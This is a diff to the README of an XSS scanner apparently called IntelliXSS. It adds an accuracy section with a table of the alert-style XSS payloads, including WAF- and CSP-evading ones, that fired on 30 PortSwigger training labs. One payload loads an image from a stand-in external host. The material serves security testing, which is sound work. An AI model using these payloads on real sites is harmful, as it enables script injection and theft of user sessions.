@@ -1,10 +1,18 @@
 # IntelliXSS v3.3
 
+[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](requirements.txt)
+[![Tests](https://img.shields.io/badge/tests-283%20passing-brightgreen)](#tests)
+[![PortSwigger labs](https://img.shields.io/badge/PortSwigger%20labs-29%2F30%20confirmed-brightgreen)](#accuracy)
+[![License](https://img.shields.io/badge/license-see%20LICENSE-lightgrey)](#license)
+
 XSS scanner built around one rule: a finding is only as strong as the evidence
 behind it. The scanner measures what the target does to a payload - which
 characters survive, where the reflection lands, which filter rewrites it - and
 derives the next payload from that measurement instead of spraying a generic
 list.
+
+[Install](#install) &bull; [Usage](#quick-start) &bull; [How it works](#how-a-scan-proceeds)
+&bull; [Accuracy](#accuracy) &bull; [Architecture](#architecture)
 
 ## Install
 
@@ -125,13 +133,63 @@ finding to the stronger row, which is why it is never set optimistically.
 ## Accuracy
 
 Measured against the 30 PortSwigger Web Security Academy XSS labs, with no
-per-lab tuning. Results, method and the exact payload that fired on each lab
-are in `benchmark/`:
+per-lab tuning and no per-lab flags: **29 confirmed, 1 static-only, 0 missed.**
 
-```bash
-python _psbench.py     # scan the 30 labs
-python _psproof.py     # rebuild benchmark/SUMMARY.md and the lab pages
-```
+A lab counts as `CONFIRMED` only when headless Chromium ran the payload and the
+payload's own unique `ixm...` marker came back. A `CLEAN` row on a lab that has
+a known exploit would be a false negative and is recorded as a defect, so the
+score cannot be raised by reporting everything as vulnerable.
+
+![Console output of a scan](docs/console.png)
+
+![HTML report produced by the same scan](docs/report.png)
+
+Both images come from a real run: `docs/console.png` is the scanner's own
+output, `docs/report.png` the report it wrote. Regenerate with
+`python _shots.py`.
+
+### Per-lab results
+
+| # | Lab | Difficulty | Verdict | Parameter | Context | Payload that fired |
+|---|-----|-----------|---------|-----------|---------|--------------------|
+| 1 | `reflected-html` | APPRENTICE | **CONFIRMED** | `search` | `html_text` | `<script>alert('ixm055cc2ce')</script>` |
+| 2 | `stored-html` | APPRENTICE | **CONFIRMED** | `comment` | `js_in_attr` | `<img src=x onerror=alert('ixm4c5ca56d')>` |
+| 3 | `dom-document.write` | APPRENTICE | **CONFIRMED** | `search` | `html_text` | `x"%09onload%3D"alert('ixm06a943c5')"%09x="` |
+| 4 | `dom-innerhtml` | APPRENTICE | **CONFIRMED** | `search` | `html_text` | `</select><svg%20onload%3Dalert('ixm06a943c5')>` |
+| 5 | `dom-jquery-href` | APPRENTICE | **CONFIRMED** | `returnPath` | `html_text` | `javascript:alert('ixmf5d7a03f')` |
+| 6 | `dom-jquery-selector` | APPRENTICE | **CONFIRMED** | `#fragment` | `url_fragment` | `x:has(<img src=x onerror=alert('ixm51601632')>)` |
+| 7 | `attr-double` | APPRENTICE | **CONFIRMED** | `search` | `html_attr_double` | `"onfocus=alert('ixm35fc4a56') autofocus x="` |
+| 8 | `href-attr` | APPRENTICE | **CONFIRMED** | `website` | `html_attr_href` | `javascript:alert('ixmcc71ea77')` |
+| 9 | `js-string` | APPRENTICE | **CONFIRMED** | `search` | `js_string_single` | `';alert('ixm6f216e5f');//` |
+| 10 | `dom-select` | PRACTITIONER | **CONFIRMED** | `storeId` | `html_text` | `</select><svg%20onload%3Dalert('ixme6b2bddc')>` |
+| 11 | `angularjs` | PRACTITIONER | **CONFIRMED** | `search` | `html_text` | `{{constructor.constructor('alert("ixmd11df425")')()}}` |
+| 12 | `dom-reflected` | PRACTITIONER | **CONFIRMED** | `search` | `html_text` | `\"};alert('ixm06a943c5');//` |
+| 13 | `dom-stored` | PRACTITIONER | **CONFIRMED** | `comment` | `html_text` | `<><img src=x onerror=alert('ixm69b55d48')>` |
+| 14 | `waf-tags` | PRACTITIONER | **CONFIRMED** | `search` | `html_text` | `<xss popover onbeforetoggle=alert('ixm7b9b721b')>` |
+| 15 | `waf-custom-tag` | PRACTITIONER | **CONFIRMED** | `search` | `html_text` | `<xss autofocus onfocus=alert('ixmc3b67ffc') tabindex=1>` |
+| 16 | `svg-allowlist` | PRACTITIONER | **CONFIRMED** | `search` | `html_text` | `<svg><animatetransform onbegin=alert('ixm8fad9987')></svg>` |
+| 17 | `canonical-link` | PRACTITIONER | **CONFIRMED** | `search` | `html_attr_href` | `'accesskey='x'onclick=alert(`ixmfbd1233d`)` |
+| 18 | `js-sq-escaped` | PRACTITIONER | **CONFIRMED** | `search` | `js_string_single` | `</script><img src=x onerror=alert('ixmab37ef77')>` |
+| 19 | `js-sq-escaped2` | PRACTITIONER | **CONFIRMED** | `search` | `js_string_single` | `\';x=new Image;x.src=`//ixm13d2bab5.ixm.example/x`//` |
+| 20 | `onclick-escaped` | PRACTITIONER | **CONFIRMED** | `website` | `js_in_attr` | `http://x&apos;);alert(`ixm9f7d664a`);//` |
+| 21 | `template-literal` | PRACTITIONER | **CONFIRMED** | `search` | `js_template` | `${alert(String.fromCharCode(105,120,109,49,48,53,50,102,5…` |
+| 22 | `stored-cookie` | PRACTITIONER | **CONFIRMED** | `comment` | `js_in_attr` | `<img src=x onerror=alert('ixmb6b44226')>` |
+| 23 | `stored-password` | PRACTITIONER | **CONFIRMED** | `comment` | `js_in_attr` | `<img src=x onerror=alert('ixmc4ae5083')>` |
+| 24 | `stored-csrf` | PRACTITIONER | **CONFIRMED** | `comment` | `js_in_attr` | `<img src=x onerror=alert('ixm49d15dcd')>` |
+| 25 | `angular-sandbox` | EXPERT | **static-only** | `search` | `html_text` | `{{$eval('alert("ixmdb1d6f29")')}}` |
+| 26 | `angular-csp` | EXPERT | **CONFIRMED** | `content` | `html_text` | `<img src=x onerror=alert('ixm6207779f')>` |
+| 27 | `waf-events-href` | EXPERT | **CONFIRMED** | `search` | `html_text` | `<svg><a><animate attributeName=href values=javascript:ale…` |
+| 28 | `js-url-blocked` | EXPERT | **CONFIRMED** | `postId` | `js_string_single` | `1&'},x=x=%3E{throw/**/onerror=alert,%27ixm73f10df5%27},to…` |
+| 29 | `csp-dangling` | EXPERT | **CONFIRMED** | `email` | `html_attr_double` | `"><svg/onload=alert('ixmec2983db')>` |
+| 30 | `csp-bypass` | EXPERT | **CONFIRMED** | `search` | `html_text` | `<svg/onload=alert('ixmfaf31068')>` |
+
+Lab 25 is the only row not confirmed in a browser. The Angular sandbox defeats
+the expression by construction, source analysis proves the source reaches the
+sink, and the finding is reported as `static-only` rather than dressed up as
+proof.
+
+The full payload, the page it fired on and the request that reproduces it are
+in `benchmark/results.json`.
 
 ## Architecture
 
@@ -162,5 +220,11 @@ reporting, and filter evasion.
 ```bash
 python -m pytest -q
 ```
+
+## License
+
+No license file is included yet, which under copyright means all rights
+reserved: reading and reviewing are fine, redistribution is not. Add a
+`LICENSE` before publishing it as a library or accepting contributions.
 
 Authorized testing only.
